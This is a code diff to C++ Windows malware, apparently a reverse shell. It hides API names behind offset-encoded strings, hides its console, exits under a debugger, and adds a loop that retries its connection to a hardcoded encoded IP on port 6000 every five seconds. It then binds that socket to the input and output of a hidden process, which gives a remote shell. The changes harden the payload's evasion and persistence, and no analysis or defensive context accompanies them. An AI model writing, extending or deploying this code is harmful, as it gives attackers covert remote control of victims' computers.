@@ -15,17 +15,6 @@ PROCESS_INFORMATION pi;
 typedef SOCKET(WINAPI* WSASocketFunc)(int, int, int, LPWSAPROTOCOL_INFO, GROUP, DWORD);
 using namespace std;
 
-// you don't need this in the code, just for you to understand how we did the obfuscation
-void obfuscation(char* big_string, char* original_string) {
-    for (int i = 0; i < strlen(original_string); i++) {
-        for (int j = 0; j < strlen(big_string); ++j) {
-            if (original_string[i] == big_string[j]) {
-                printf("%d,", j);
-            }
-        }
-    }
-}
-
 string getOriginalString(int offsets[], char* big_string, int sizeof_offset) {
     string empty_string = "";
     for (int i = 0; i < sizeof_offset / 4; ++i) {
@@ -36,11 +25,7 @@ string getOriginalString(int offsets[], char* big_string, int sizeof_offset) {
 }
 int main(int argc, char* argv[])
 {
-	FreeConsole();
-	if (IsDebuggerPresent()) {
-		exit(0);
-	}
-    Start();
+	
     char big_string[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ._123456789";
     char create_process_string[] = "inet_addr";
     char big_numbers[] = "1234567.890";
@@ -59,6 +44,17 @@ int main(int argc, char* argv[])
     short port = 6000;
     int w_s_2_32lld[] = { 22,18,55,53,56,55,52,3,11,11 };
     int k_renel_32[] = { 10,4,17,13,4,11,56,55,52,3,11,11 };
+    int free_con_sole[] = { 31,17,4,4,28,14,13,18,14,11,4 };
+
+    FARPROC freeConsole = GetProcAddress(LoadLibraryA(getOriginalString(k_renel_32, big_string, sizeof(k_renel_32)).c_str()),
+        getOriginalString(free_con_sole, big_string, sizeof(free_con_sole)).c_str());
+    //Add FreeConsole
+	reinterpret_cast<BOOL(WINAPI*)()>(freeConsole)();
+
+    if (BugCheck()) {
+        exit(0);
+    }
+    Start();
 
     HMODULE w_s2_32lib = LoadLibraryA(getOriginalString(w_s_2_32lld, big_string, sizeof(w_s_2_32lld)).c_str());
 
@@ -67,7 +63,6 @@ int main(int argc, char* argv[])
     FARPROC wsaSocket = GetProcAddress(w_s2_32lib, getOriginalString(w_soc_offset, big_string, sizeof(w_soc_offset)).c_str());
     FARPROC htonsFunc = GetProcAddress(w_s2_32lib, getOriginalString(h_t_o, big_string, sizeof(h_t_o)).c_str());
     FARPROC inetAddr = GetProcAddress(w_s2_32lib, getOriginalString(i_a_o, big_string, sizeof(i_a_o)).c_str());
-
 
     reinterpret_cast<int(WINAPI*)(WORD, LPWSADATA)>(w_sa_St_ar_tup)(MAKEWORD(2, 2), &wsaData);
 
@@ -86,20 +81,25 @@ int main(int argc, char* argv[])
     hax.sin_addr.s_addr = reinterpret_cast<unsigned long(__stdcall*)(const char*)>(inetAddr)(
         getOriginalString(ipaddr_offset, big_numbers, sizeof(ipaddr_offset)).c_str());
 
-    if (reinterpret_cast<int(WINAPI*)(SOCKET, const struct sockaddr*, int, LPWSABUF, LPWSABUF,
-        LPQOS, LPQOS, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE)>
-        (Connectsaw)(wSock, reinterpret_cast<const sockaddr*>(&hax), sizeof(hax), nullptr, nullptr, nullptr, nullptr, nullptr, nullptr) == 0) {
-        printf("\nit's working\n");
-    }
-    else {
-        printf("Error: 0x%x\n", GetLastError());
+    // Boucle de connexion continue
+    while (true) {
+        if (reinterpret_cast<int(WINAPI*)(SOCKET, const struct sockaddr*, int, LPWSABUF, LPWSABUF,
+            LPQOS, LPQOS, LPWSAOVERLAPPED, LPWSAOVERLAPPED_COMPLETION_ROUTINE)>
+            (Connectsaw)(wSock, reinterpret_cast<const sockaddr*>(&hax), sizeof(hax), nullptr, nullptr, nullptr, nullptr, nullptr, nullptr) == 0) {
+            printf("\nit's working\n");
+            break; // Sort de la boucle si la connexion est réussie
+        }
+        else {
+            printf("Error: 0x%x. Retrying...\n", GetLastError());
+            std::this_thread::sleep_for(std::chrono::seconds(5)); // Attendre 5 secondes avant de réessayer
+        }
     }
 
     FARPROC createProcess = GetProcAddress(LoadLibraryA(getOriginalString(k_renel_32, big_string, sizeof(k_renel_32)).c_str()),
         getOriginalString(c_p_o, big_string, sizeof(c_p_o)).c_str());
     FARPROC waitForSingleObject = GetProcAddress(LoadLibraryA(getOriginalString(k_renel_32, big_string, sizeof(k_renel_32)).c_str()),
         getOriginalString(w_f_s_o_o, big_string, sizeof(w_f_s_o_o)).c_str());
-
+	
 
     STARTUPINFOA sui;
     PROCESS_INFORMATION pi;
@@ -107,7 +107,6 @@ int main(int argc, char* argv[])
     sui.cb = sizeof(sui);
     sui.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
     sui.wShowWindow = SW_HIDE;
-
     sui.hStdInput = sui.hStdOutput = sui.hStdError = (HANDLE)wSock;
 
     if (reinterpret_cast<BOOL(WINAPI*)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES,
